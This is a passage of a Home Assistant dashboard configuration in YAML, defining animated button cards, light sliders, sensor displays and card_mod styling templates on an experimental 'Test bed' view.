                    styles:
                      card:
                        - box-shadow: none
                        - background-color: transparent
                        - border: 1
                        - padding: 15%
                        - color: yellow
                        - opacity: 1
                        - font-size: 10px
                        - text-shadow: 0px 0px 5px black
                        - text-transform: capitalize
                      icon:
                        - width: 40%
                        - padding-top: 10px
                      label:
                        - color: gray
                        - font-size: 10px
                        - padding-top: 0px
                        - opacity: 0.7
                      name:
                        - white-space: normal
                        - font-weight: 300
                        - font-size: 10px
                        - color: white
                    tap_action:
                      action: toggle
                    hold_action:
                      action: more-info
              exclude:
                - state: 'off'
                - entity_id: '*lights*'
                - entity_id: '*screen*'
                - state: '0'
                - state: unavailable
            sort:
              method: name
              reverse: false
              numeric: false
            show_empty: true
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        icon: mdi:star
        name: Blink
        styles:
          icon:
            - animation: blink 1s infinite
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-25px); }
            60% { transform: translateY(-15px); }
          }
        icon: mdi:star
        name: Bounce
        styles:
          icon:
            - animation: bounce 1s infinite
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @-webkit-keyframes swing
          {
              15%
              {
                  -webkit-transform: translateX(5px);
                  transform: translateX(5px);
              }
              30%
              {
                  -webkit-transform: translateX(-5px);
                 transform: translateX(-5px);
              } 
              50%
              {
                  -webkit-transform: translateX(3px);
                  transform: translateX(3px);
              }
              65%
              {
                  -webkit-transform: translateX(-3px);
                  transform: translateX(-3px);
              }
              80%
              {
                  -webkit-transform: translateX(2px);
                  transform: translateX(2px);
              }
              100%
              {
                  -webkit-transform: translateX(0);
                  transform: translateX(0);
              }
          }
        icon: mdi:star
        name: Swing
        styles:
          icon:
            - animation: swing 1s infinite
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes red-alert {
            0% {
              -moz-box-shadow: 0 0 0 0 rgba(255,0,0, 0.7);
              box-shadow: 0 0 0 0 rgba(255,0,0, 0.7);
            }
            70% {
                -moz-box-shadow: 0 0 0 10px rgba(240,52,52, 0.9);
                box-shadow: 0 0 0 15px rgba(240,52,52, 0.7);
            }
            100% {
                -moz-box-shadow: 0 0 0 0 rgba(240,52,52, 0);
                box-shadow: 0 0 0 0 rgba(240,52,52, 0);
            }
          }
        icon: mdi:star
        name: Red Alert
        styles:
          icon:
            - animation: red-alert 1s infinite
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes scale {
           from {
             transform: scale(1);
             box-shadow: 0 8px 6px -6px #6C7A89;
           }
           to {
             transform: scale(1.25);
             box-shadow: 0 10px 6px -6px #6C7A89;
           }
        icon: mdi:star
        name: Scale
        styles:
          icon:
            - animation: scale 2s ease-in-out infinite alternate
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        icon: mdi:star
        name: Rotating
        styles:
          icon:
            - animation: rotating 5s linear infinite alternate
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes fade {
            0%, 100% {
              opacity: 0.5;
            }
            50% {
              opacity: 1;
            }
          }
        icon: mdi:star
        name: Fade
        styles:
          icon:
            - animation: fade 2s ease-in-out infinite alternate
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes heartbeat {
            0% {
              opacity: 1;
              transform: scale(0.95);
            }
            30% {
              opacity: 0.7;
              transform: scale(1.05);
            }
            40% {
              opacity: 1;
              transform: scale(0.9);
            }
            50% {
              opacity: 0.7;
              transform: scale(1.1);
            }
            60% {
              opacity: 1;
              transform: scale(0.95);
            }
            90% {
              opacity: 1;
              transform: scale(0.95);
            }
            100% {
              opacity: 1;
              transform: scale(0.95);
            }
          }
        icon: mdi:star
        name: Heartbeat
        styles:
          icon:
            - animation: heartbeat 1.5s infinite
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @-webkit-keyframes WidthAni {
            0% {width: 0px}
            10% {width: 50%;left: 0;right: 0}
            20% {width: 5%;left: 95%;}
            25% {width: 5%;left: 95%;}
            35% {width: 50%;left: 0%;}
            45% {width: 0%;}
            100% {width: 0%;}
          }
        icon: mdi:star
        name: In & Out
        styles:
          icon:
            - animation: WidthAni 5.0s infinite ease-in-out
      - type: custom:button-card
        entity: binary_sensor.hallway_closet
        extra_styles: |
          @keyframes cool {
            0% {
              transform: rotate(0deg);
              background-color: #ff4081;
            }
            25% {
              transform: rotate(90deg);
              background-color: #40c4ff;
            }
            50% {
              transform: rotate(180deg);
              background-color: #ffdd57;
            }
            75% {
              transform: rotate(270deg);
              background-color: #ccff90;
            }
            100% {
              transform: rotate(360deg);
              background-color: #ff4081;
            }
          }
        icon: mdi:star
        name: Cool
        styles:
          icon:
            - animation: cool 4s infinite
  - title: Test bed
    icon: mdi:test-tube
    path: lab
    badges: []
    cards:
      - type: horizontal-stack
        title: bedroom1
        card_mod:
          style: |
            ha-card {
              border: solid 1px var(--primary-text-color);
              background-color: rgba(0, 0, 0, 0)
            }
        cards:
          - type: custom:light-brightness-preset-row
            entity: light.bedroom1
            name: ' '
            reverseButtons: true
            customSetpoints: true
            lowBrightness: 30
            medBrightness: 127
            hiBrightness: 255
          - type: custom:slider-entity-row
            entity: light.bedroom1
            toggle: false
            hide_state: true
            hide_when_off: true
            full_row: true
            haptic: light
            min: 5
            step: 10
      - type: vertical-stack
        title: RGB Light card (visible when on)
        cards:
          - type: custom:rgb-light-card
            entity: light.bedroom1
            hide_when_off: true
            justify: center
            colors:
              - rgb_color:
                  - 255
                  - 0
                  - 0
                transition: 0
              - rgb_color:
                  - 0
                  - 255
                  - 0
                transition: 0
              - rgb_color:
                  - 0
                  - 0
                  - 255
                transition: 0
              - color_temp: 288
                transition: 0
              - kelvin: 2000
                transition: 0
        state_color: true
      - type: vertical-stack
        title: Auto entities - motion detectors
        cards:
          - type: custom:auto-entities
            card:
              type: entities
              card_mod:
                style: |
                  ha-card {
                    border: solid 1px var(--primary-text-color);
                    background-color: rgba(0, 0, 0, 0)
                  }
            filter:
              include:
                - entity_id: '*motion_detector_o*'
              exclude: []
            sort:
              method: none
      - type: custom:button-card
        template: generic_custom_button
        show_header_toggle: false
        entity: zone.home
        icon: mdi:restart
        name: Theme Restart
        show_state: false
        show_icon: true
        styles:
          card:
            - height: 150px
            - width: 150px
            - '--mdc-ripple-color': red
            - '--mdc-ripple-press-opacity': 1.5
        tap_action:
          action: none
        hold_action:
          action: call-service
          service: frontend.reload_themes
      - type: grid
        cards:
          - type: custom:button-card
            template: generic_custom_button
            entity: sensor.s22_ultra_battery_level
            name: S22
            styles:
              icon:
                - animation: |
                    [[[
                      if (states['binary_sensor.s22_ultra_is_charging'].state === 'on') return 'blink 2s ease infinite';
                    ]]]
                - color: |
                    [[[
                      if (states['binary_sensor.s22_ultra_is_charging'].state === 'on')
                        return 'red';
                    ]]] 
          - type: custom:button-card
            template: generic_custom_button
            entity: sensor.s22_ultra_battery_level
            name: S22
            variables:
              var_color: |-
                [[[ 
                  var blevel=entity.state;
                  if (blevel > 70) return 'lime';
                  else if (blevel >= 30) return 'yellow';
                  else return 'red';
                ]]]
            custom_fields:
              battery_percentage: |
                [[[
                  return `${entity.state}%`
                ]]] 
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
              custom_fields:
                battery_percentage:
                  - align-self: right
                  - position: absolute
                  - right: 9%
                  - top: 3%
                  - font-size: 14px
                  - color: '[[[ return variables.var_color ]]]'
          - type: custom:button-card
            template: generic_custom_button
            entity: sensor.s22_ultra_battery_level
            name: S22
            variables:
              var_color: |-
                [[[ 
                  var blevel=entity.state;
                  if (blevel > 80) return 'lime';
                  else if (blevel >= 30) return 'green';
                  else if (blevel >= 30) return 'orange';
                  else if (blevel >= 30) return 'yellow';
                  else return 'red';
                ]]]
            custom_fields:
              battery_percentage: |
                [[[
                  return `${entity.state}%`
                ]]] 
            styles:
              icon:
                - color: '[[[ return variables.var_color ]]]'
              custom_fields:
                battery_percentage:
                  - align-self: right
                  - position: absolute
                  - right: 9%
                  - top: 14%
                  - font-size: 14px
                  - color: '[[[ return variables.var_color ]]]'
                  - transform: rotate(90deg)
      - type: entities
        entities:
          - entity: light.living_room1
          - entity: light.living_room1
          - entity: light.living_room1
          - entity: light.living_room1
        show_header_toggle: false
        title: Card Mod Test
        card_mod:
          style: |
            ha-card {
              border: solid 1px var(--primary-text-color);
              background-color: rgba(0, 0, 0, 0)
            }
      - type: custom:button-card
        template: generic_custom_button
        show_state: true
        show_icon: false
        show_name: false
        entity: sensor.time
        styles:
          card:
            - font-size: 75px
      - type: grid
        cards:
          - type: custom:button-card
            entity: sensor.processor_temperature
            icon: mdi:raspberry-pi
            aspect_ratio: 1/1
            name: HassOS
            styles:
              card:
                - background-color: '#000044'
                - border-radius: 10%
                - padding: 10%
                - color: ivory
                - font-size: 10px
                - text-shadow: 0px 0px 5px black
                - text-transform: capitalize
              grid:
                - grid-template-areas: '""i temp"" ""n n"" ""cpu cpu"" ""ram ram"" ""sd sd""'
                - grid-template-columns: 1fr 1fr
                - grid-template-rows: 1fr min-content min-content min-content min-content
              name:
                - font-weight: bold
                - font-size: 13px
                - color: white
                - align-self: middle
                - justify-self: start
                - padding-bottom: 4px
              img_cell:
                - justify-content: start
                - align-items: start
                - margin: none
              icon:
                - color: |
                    [[[
                      if (entity.state < 60) return 'lime';
                      if (entity.state >= 60 && entity.state < 80) return 'orange';
                      else return 'red';
                    ]]]
                - width: 70%
                - margin-top: '-10%'
              custom_fields:
                temp:
                  - align-self: start
                  - justify-self: end
                cpu:
                  - padding-bottom: 2px
                  - align-self: middle
                  - justify-self: start
                  - '--text-color-sensor': >-
                      [[[ if (states[""sensor.processor_use""].state > 80) return
                      ""red""; ]]]
                ram:
                  - padding-bottom: 2px
                  - align-self: middle
                  - justify-self: start
                  - '--text-color-sensor': >-
                      [[[ if (states[""sensor.memory_use_percent""].state > 80)
                      return ""red""; ]]]
                sd:
                  - align-self: middle
                  - justify-self: start
                  - '--text-color-sensor': >-
                      [[[ if
                      (states[""sensor.derek_s_fire_10_external_storage""].state >
                      80) return ""red""; ]]]
            custom_fields:
              temp: |
                [[[
                  return `<ha-icon
                    icon=""mdi:thermometer""
                    style=""width: 12px; height: 12px; color: yellow;"">
                    </ha-icon><span>${entity.state}°F</span>`
                ]]]
              cpu: |
                [[[
                  return `<ha-icon
                    icon=""mdi:server""
                    style=""width: 12px; height: 12px; color: deepskyblue;"">
                    </ha-icon><span>CPU: <span style=""color: var(--text-color-sensor);"">${states['sensor.processor_use'].state}%</span></span>`
                ]]]
              ram: |
                [[[
                  return `<ha-icon
                    icon=""mdi:memory""
                    style=""width: 12px; height: 12px; color: deepskyblue;"">
                    </ha-icon><span>RAM: <span style=""color: var(--text-color-sensor);"">${states['sensor.memory_use_percent'].state}%</span></span>`
                ]]]
              sd: |
                [[[
                  return `<ha-icon
                    icon=""mdi:harddisk""
                    style=""width: 12px; height: 12px; color: deepskyblue;"">
                    </ha-icon><span>SD: <span style=""color: var(--text-color-sensor);"">${states['sensor.derek_s_fire_10_external_storage'].state}%</span></span>`
                ]]]
      - type: entities
        show_header_toggle: false
        title: Entities with sliders
        entities:
          - type: custom:slider-entity-row
            entity: light.all_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.bathroom_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.bedroom_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.hallway
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.kitchen_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.living_room_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
          - type: custom:slider-entity-row
            entity: light.office_lights
            toggle: true
            hide_when_off: true
            haptic: light
            min: 5
            step: 20
        state_color: true
      - type: vertical-stack
        title: Markdown with formatted date/time
        cards:
          - type: markdown
            content: '{{ now().strftime(""%m/%d/%Y, %H:%M"") }}'
          - type: markdown
            content: |-
              {% set time = now().hour %}
              {% if (time >= 18) %}
                Good evening, {{user}}!
              {% elif (time >= 12) %}
                Good afternoon, {{user}}!
              {% elif (time >= 6) %}
                Good morning, {{user}}!
              {% elif (time >= 0) %}
                Good night, {{user}}!
              {% else %}
                Hallo, {{user}}!
              {% endif %}
              Today is **{{ now().strftime('%B %d, %Y') }}**
            card_mod:
              style: |
                ha-markdown {
                  padding: 0 0 0 1 !important;
                  font-size: 12px !important;
                  font-weight: normal !important;
                  line-height: 1.4 !important;
                }
                ha-card {
                  font-family: Arial;
                  text-align: center;
                  width: 120px;
                  box-shadow: 0px 2px 5px 1px red;
                  border-radius: 25px;
                  margin-left: auto;
                  margin-right: auto;
                  margin-top: 4px;
                  margin-bottom: 4px;
                  padding-top: 15px;
                  padding-right: 15px;
                  padding-left: 15px;
                  padding-bottom: 15px; 
                  padding: 15px;
                  {% if is_state('light.bedroom_lights', 'on') %}
                    background-color: yellow;
                    color: black;
                    box-shadow: inset 0px 0px 5px 1px black;
                  {% else %}
                    background: transparent;
                    color: yellow;
                    box-shadow: inset 0px 0px 5px 1px yellow;
                  {% endif %}
                } 
          - type: markdown
            content: '{{ now().strftime(""%m/%d/%y, %H:%M"") }}'
            card_mod:
              style: |
                ha-card {
                  background: transparent;
                }
                :host {
                  position: fixed;
                  top: 0px;
                  right: 10%;
                  z-index: 99;
                  font-size:25px;
                }
          - type: markdown
            content: '{{ states(""input_select.navigation_test_variable"") }}'
      - type: vertical-stack
        title: Button card with glow when on
        cards:
          - type: grid
            cards:
              - type: custom:button-card
                layout: icon_name
                entity: light.living_room1
                label: lamp
                show_state: false
                show_name: false
                show_label: true
                color: auto
                styles:
                  grid:
                    - grid-template-rows: 42px 0px auto
                    - grid-template-columns: 42px auto
                  icon:
                    - height: 30px
                    - width: 30px
                  card:
                    - border-radius: 15px
                    - height: 76px
                    - width: 76px
                    - margin: 5px 5px 0px 0px
                    - padding: 0px 0px
                  label:
                    - justify-self: end
                    - align-self: end
                    - padding: 9px 10px
                    - font-size: 12px
                    - text-transform: capitalize
                state:
                  - value: 'on'
                    styles:
                      card:
                        - '--paper-card-background-color': rgba(40, 40, 40)
                        - box-shadow: inset 0px 0px 10px 3px yellow
                      name:
                        - color: white
                      state:
                        - color: white
                      label:
                        - color: white
                  - value: 'off'
                    styles: null
                tap_action:
                  action: toggle
              - type: custom:button-card
                layout: icon_name
                entity: light.living_room1
                label: lamp
                show_state: false
                show_name: false
                show_label: true
                color: auto
                styles:
                  grid:
                    - grid-template-rows: 42px 0px auto
                    - grid-template-columns: 42px auto
                  icon:
                    - height: 30px
                    - width: 30px
                  card:
                    - border-radius: 15px
                    - height: 76px
                    - width: 76px
                    - margin: 5px 5px 0px 0px
                    - padding: 0px 0px
                  label:
                    - justify-self: center
                    - align-self: end
                    - padding: 9px 10px
                    - font-size: 12px
                    - text-transform: capitalize
                state:
                  - value: 'on'
                    styles:
                      card:
                        - '--paper-card-background-color': rgba(40, 40, 40)
                        - box-shadow: inset 0px 0px 10px 3px yellow
                      name:
                        - color: white
                      state:
                        - color: white
                      label:
                        - color: white
                  - value: 'off'
                    styles: null
                tap_action:
                  action: toggle
      - type: vertical-stack
        title: Templated sensor (in configuration.yaml)
        cards:
          - type: grid
            columns: 2
            cards:
              - type: sensor
                entity: sensor.sensor_f2c
                graph: none
              - type: sensor
                entity: sensor.bathroom_door_temperature
                graph: none
            square: false
          - type: custom:button-card
            entity: sensor.bathroom_door_temperature
            name: '[[[ return Math.round(entity.state) + "" °F"" ]]]'
            state_display: '[[[ return Math.round(entity.state * 10) / 10  + "" °F"" ]]]'
            show_state: true
            show_icon: false
      - type: custom:stack-in-card
        mode: vertical
        title: Show an entity's attribute
        cards:
          - type: custom:button-card
            entity: light.living_room1
            name: '[[[ return entity.attributes.brightness]]]'
            show_icon: false
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
          - type: custom:button-card
            entity: light.living_room1
            name: '[[[ return entity.state ]]]'
            show_icon: false
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
          - type: custom:button-card
            entity: light.living_room1
            name: >-
              [[[ if (entity.state === ""on"") return ""Yup""; if (entity.state ===
              ""off"") return ""Nope"";  else return ""Dunno""]]]
            show_icon: false
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
          - type: custom:button-card
            entity: light.living_room1
            name: This is a test
            show_icon: false
            styles:
              name:
                - font-family: Wingdings
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
      - type: custom:apexcharts-card
        series:
          - entity: sensor.bathroom_door_temperature
      - type: custom:mushroom-media-player-card
        entity: media_player.plex_plex_for_windows_desktop_p54jk04
        name: Plex
        icon: mdi:plex
        use_media_info: true
        show_volume_level: true
        media_controls:
          - play_pause_stop
        volume_controls: []
        fill_container: true
        collapsible_controls: true
        hold_action:
          action: none
        double_tap_action:
          action: none
        icon_type: entity-picture
      - type: custom:button-card
        header: State modifiers
        entity: input_boolean.automation_override
        show_name: true
        show_state: true
        name: Automations
        icon: mdi:lightbulb-auto-outline
        state:
          - value: 'off'
            operator: '=='
            styles:
              icon:
                - color: red
            state_display: Automations are off.
          - value: 'on'
            operator: '=='
            styles:
              icon:
                - color: green
                - icon: mdi:lightbulb
            state_display: Automations are on.
      - type: custom:stack-in-card
        mode: vertical
        title: Icon based on another entity state
        cards:
          - type: custom:button-card
            entity: light.bedroom1
            name: Bedroom1
            color: auto
            icon: |
              [[[  
                if (states['input_boolean.tester'].state === 'on')
                  return 'mdi:lightbulb';
                else
                  return 'mdi:lightbulb-auto';
              ]]]  
          - type: custom:button-card
            entity: light.bedroom1
            name: Bedroom1
            color: auto
            icon: |
              [[[
                 if (states['input_boolean.tester'].state == ""on"")
                   return 'phu:ikea-blind-closed';
                 if (states['input_boolean.tester'].state == ""off"") 
                   return 'phu:ikea-blind-open';
              ]]]
          - type: custom:button-card
            entity: light.bedroom1
            name: Bedroom1
            color: auto
            icon: |
              [[[
                 if (entity.state == ""on"")
                   return 'phu:ikea-blind-closed';
                 if (entity.state == ""off"") 
                   return 'phu:ikea-blind-open';
              ]]]
      - type: custom:mini-media-player
        name: Desktop Plex
        entity: media_player.plex_plex_for_windows_desktop_p54jk04
        icon: mdi:plex
        artwork: full
        source: full
        mini-media-player-scale: 1
        hide:
          power_state: false
          power: true
          source: true
          name: true
          icon: true
          runtime: false
          controls: full
          volume: false
          progress: true
      - type: custom:stack-in-card
        title: Icon and color based on state (card_mod)
        mode: vertical
        cards:
          - type: entities
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
            entities:
              - entity: light.hallway
                name: Entity card using one state
                card_mod:
                  style: |-
                    :host {
                      {% if is_state('light.hallway', 'off') %}
                        --card-mod-icon: mdi:light-switch-off;
                        --card-mod-icon-color: red;
                      {% else %}
                        --card-mod-icon: mdi:light-switch;
                        --card-mod-icon-color: green;
                      {% endif %}
                    }
              - entity: light.living_room_lights
                name: Entity card using time range
                card_mod:
                  style: |-
                    :host {
                      {% if today_at('15:00') < now() < today_at('21:00') %}
                        --card-mod-icon-color: green;
                      {% else %}
                        --card-mod-icon-color: red;
                      {% endif %}
                      --card-mod-icon: mdi:currency-usd;
                    }
          - type: entities
            card_mod:
              style: |
                ha-card {
                  border: none;
                }
            entities:
              - entity: light.hallway
                name: Entity card using two states
                card_mod:
                  style: |-
                    :host {
                      {% if is_state('light.hallway', 'off') and is_state('person.derek', 'home') %}
                        --card-mod-icon: mdi:light-switch-off;
                        --card-mod-icon-color: red;
                      {% elif is_state('light.hallway', 'off') and is_state('person.derek', 'not_home') %}
                        --card-mod-icon: mdi:chat-question;
                        --card-mod-icon-color: white;
                      {% else %}
                        --card-mod-icon: mdi:light-switch;
                        --card-mod-icon-color: yellow;
                      {% endif %}
                    }
          - type: button
            name: Button card with one state
            show_name: true
            show_icon: true
            entity: light.hallway
            tap_action:
              action: toggle
            card_mod:
              style: |-
                :host {
                  {% if is_state('light.hallway', 'off') %}
                    --card-mod-icon: mdi:light-switch-off;
                    --card-mod-icon-color: red;
                  {% else %}
                    --card-mod-icon: mdi:light-switch;
                    --card-mod-icon-color: yellow;
                  {% endif %}
                }
                ha-card {
                  border: none;
                }
          - type: button
            name: Button card comparing numbers
            show_name: true
            show_icon: true
            tap_action:
              action: none
            card_mod:
              style: |-
                :host {
                  background-color: dimgray;
                  {% set level = states('sensor.s22_ultra_battery_level') | int %}
                  {% if level >= 80 %}
                    --card-mod-icon: mdi:check;
                    --card-mod-icon-color: green;
                  {% elif level >= 40 %}
                    --card-mod-icon: mdi:thumb-up;
                    --card-mod-icon-color: yellow;
                  {% else %}
                    --card-mod-icon: mdi:thumb-down;
                    --card-mod-icon-color: red;
                  {% endif %}
                }
                ha-card {
                  border: none;
                  --primary-text-color: hotpink;
                  --secondary-text-color: blue;
                }
      - type: vertical-stack
        title: Trigger an automation
        cards:
          - type: custom:mushroom-entity-card
            entity: automation.test_automation
            icon: mdi:controller
            icon_color: deep-orange
            layout: vertical
            secondary_info: none
            name: Call Automation
            tap_action:
              action: call-service
              service: automation.trigger
              service_data:
                entity_id: automation.test_automation
      - type: vertical-stack
        title: Tap navigate based on variable from entity
        cards:
          - type: entities
            entities:
              - input_select.navigation_test_variable
          - type: custom:button-card
            entity: input_select.navigation_test_variable
            size: 25px
            name: '[[[ return entity.state ]]]'
            tap_action:
              action: navigate
              navigation_path: '[[[ return entity.state ]]]'
      - type: vertical-stack
        title: Return count of lights on in group
        cards:
          - type: custom:button-card
            entity: light.all_lights
            name: >
              [[[ var i; var entities = entity.attributes.entity_id; var count =
              0; for (i = 0; i < entities.length; i++) {
                var state = states[entities[i]].state;
                if (state == 'on') {count += 1;}
               }
              if (count == entities.length) return 'All ' + entities.length + '
              lights on'; if (count == 0) return 'No lights on'; return 'Lights
              on: ' + count + ' of ' + entities.length; ]]]
      - type: vertical-stack
        title: State-switch card (Door open > 30 sec)
        cards:
          - type: custom:state-switch
            entity: template
            template: >-
              {% if is_state('binary_sensor.living_room_door_on_off', 'on') and
              (as_timestamp(now()) -
              as_timestamp(states.binary_sensor.living_room_door_on_off.last_updated))|int
              > 30 %}  open_too_long  {% endif %}
            states:
              open_too_long:
                type: custom:mushroom-chips-card
                chips:
                  - type: template
                    icon_color: red
                    icon: mdi:door-open
                    card_mod:
                      style: |
                        ha-card { 
                        animation: blink 1s linear infinite; 
                        --chip-icon-size: 0.6em; 
                        }
                    hold_action:
                      action: navigate
                      navigation_path: /fire-main/sensors
      - type: vertical-stack
        title: Custom button with multiple IFs
        cards:
          - type: custom:button-card
            variables:
              temperature: |
                [[[ 
                var temperature = states[""sensor.bedroom_temperature""].state;
                if (temperature >= 74) return ""high""; 
                else if (temperature <= 60) return ""low""; 
                else return true
                ]]]
              humidity: |
                [[[ 
                var humidity = states[""sensor.bedroom_humidity""].state;
                if (humidity >= 60) return ""high""; 
                else if (humidity <= 30) return ""low""; 
                else return true
                ]]]
            name: >
              [[[  

              if (variables.temperature == true && variables.humidity == true)
              return ""Temperature & Humidity Good"";   

              if (variables.temperature != true && variables.humidity == true)
              return ""Temperature "" + variables.temperature;  

              if (variables.temperature == true && variables.humidity != true)
              return ""Humidity "" + variables.humidity;  

              if (variables.temperature != true && variables.humidity != true)
              return ""Temperature "" + variables.temperature + "" & humidity "" +
              variables.humidity; 

              else return ""unknown""; 

              ]]]
            icon: >
              [[[ if (variables.temperature == true && variables.humidity ==
              true) return ""mdi:check"";   

              if (variables.temperature != true && variables.humidity == true)
              return ""mdi:thermometer"";  

              if (variables.temperature == true && variables.humidity != true)
              return ""mdi:water"";  

              if (variables.temperature != true && variables.humidity != true)
              return ""mdi:thermometer-water""; 

              else return ""mdi:minus-circle-outline""; ]]]
            styles:
              icon:
                - color: >
                    [[[ if (variables.temperature == true && variables.humidity
                    == true) return ""white"" ; else return ""black""; ]]]
              card:
                - color: >
                    [[[ if (variables.temperature == true && variables.humidity
                    == true) return ""white"" ; else return ""black""; ]]]
                - background-color: >
                    [[[ if (variables.temperature == true && variables.humidity
                    == true) return 'green'; else return 'red'; ]]]
      - type: custom:button-card
        entity: light.bedroom1
        template: chips
        tap_action:
          action: toggle
          entity: '[[[ return variables.ulm_chip_mdi_icon_only_entity ]]]'
        show_icon: true
        icon: '[[[ return variables.ulm_chip_mdi_icon_only_icon ]]]'
        styles:
          grid:
            - grid-template-areas: '''i'''
          icon:
            - color: '[[[ return variables.ulm_chip_mdi_icon_only_icon_color; ]]]'
        variables:
          ulm_chip_mdi_icon_only_entity: light.bedroom1
          ulm_chip_mdi_icon_only_icon: mdi:lightbulb
          ulm_chip_mdi_icon_only_icon_color: white
      - type: custom:button-card
        entity: input_number.temp_helper
        name: |
          [[[ 
          var value = states[""input_number.temp_helper""].state; 
          if (value >= 20) return ""Full""; 
          if (value >= 10) return ""Half""; 
          if (value < 10) return ""Empty""; 
          else return ""Unknown""; 
          ]]]
        icon: |
          [[[ 
          var value = states[""input_number.temp_helper""].state; 
          if (value >= 20) return ""mdi:circle""; 
          if (value >= 10) return 'mdi:circle-half-full'; 
          if (value < 10) return 'mdi:circle-outline'; 
          else return
          ]]]
      - type: custom:button-card
        show_icon: false
        entity: input_boolean.tester
        name: |-
          [[[ 
            var t = states['timer.tester'].attributes.finishes_at;
            if (entity.state === ""on"") return ""Apple""; 
            if (entity.state === ""off"") return t
          ]]]
      - type: vertical-stack
        title: Hiding entity/cards based on state
        cards:
          - type: entities
            title: Using an entities card with conditional
            entities:
              - entity: input_boolean.tester
                name: Enable automation?
              - type: conditional
                conditions:
                  - entity: input_boolean.tester
                    state: 'on'
                row:
                  entity: input_datetime.automation_nighttime_motion_detection_start
                  name: Start Time
              - type: conditional
                conditions:
                  - entity: input_boolean.tester
                    state: 'on'
                row:
                  entity: input_datetime.automation_nighttime_motion_detection_end
                  name: End Time
          - type: custom:stack-in-card
            title: Using a conditional card
            mode: vertical
            cards:
              - type: entities
                entities:
                  - entity: input_boolean.tester
                    name: Enable automation?
                card_mod:
                  style: |
                    ha-card {
                      border: none;
                    }
              - type: conditional
                conditions:
                  - entity: input_boolean.tester
                    state_not: 'off'
                card:
                  type: vertical-stack
                  cards:
                    - type: entities
                      entities:
                        - entity: >-
                            input_datetime.automation_nighttime_motion_detection_start
                          name: Start time
                      card_mod:
                        style: |
                          ha-card {
                            border: none;
                          }
                    - type: entities
                      entities:
                        - entity: >-
                            input_datetime.automation_nighttime_motion_detection_end
                          name: End time
                      card_mod:
                        style: |
                          ha-card {
                            border: none;
                          }
      - type: custom:button-card
        entity: person.derek
        name: >-
          [[[ if (entity.state === ""home"") return ""At the house""; else return
          ""Not at the house"" ]]]
      - type: custom:button-card
        entity: sensor.bedroom_temperature
        name: '[[[ return parseFloat(entity.state).toFixed(1) + ""°F"" ]]]'
      - type: vertical-stack
        title: Stack-in-card with borders removed
        cards:
          - type: custom:stack-in-card
            mode: vertical
            cards:
              - type: horizontal-stack
                cards:
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
              - type: horizontal-stack
                cards:
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
                  - show_name: true
                    show_icon: true
                    type: button
                    tap_action:
                      action: toggle
                    entity: light.living_room_lights
                    icon: mdi:sleep
                    name: Sleep
                    card_mod:
                      style: |
                        ha-card {
                          border: none;
                        }
      - show_name: true
        show_icon: true
        show_state: true
        type: glance
        entities:
          - entity: light.bedroom2
          - entity: sensor.canon_laser_printer
          - entity: button.fire_living_room_restart_browser
        columns: 4
      - type: grid
        columns: 4
        card_mod:
          style: |
            ha-card {
              padding: 0px !important;
              margin: 0px;
            }   
        cards:
          - type: custom:button-card
            entity: light.living_room_lights
            name: Lights
            card_mod:
              style: |
                ha-card {
                  padding: 0px !important;
                  margin: 0px !important;
                }  
          - type: custom:button-card
            entity: light.living_room_lights
            name: Lights
          - type: custom:button-card
            entity: light.living_room_lights
            name: Lights
          - type: custom:button-card
            entity: light.living_room_lights
            name: Lights
      - type: entities
        entities:
          - sensor.s22_ultra_battery_level
        card_mod:
          style: |-
            :host {
              {% set phlevel = states('sensor.s22_ultra_battery_level') | float %}
              {% if phlevel < 7.2 %}
                --card-mod-icon-color: red;
                --card-mod-icon: mdi:stop-circle-outline;
                --primary-text-color: red;
              {% elif phlevel > 7.2 and phlevel < 7.39 %}
                --card-mod-icon: mdi:sign-caution
                --card-mod-icon-color: yellow;
              {% elif phlevel > 7.4 and phlevel < 7.59 %}
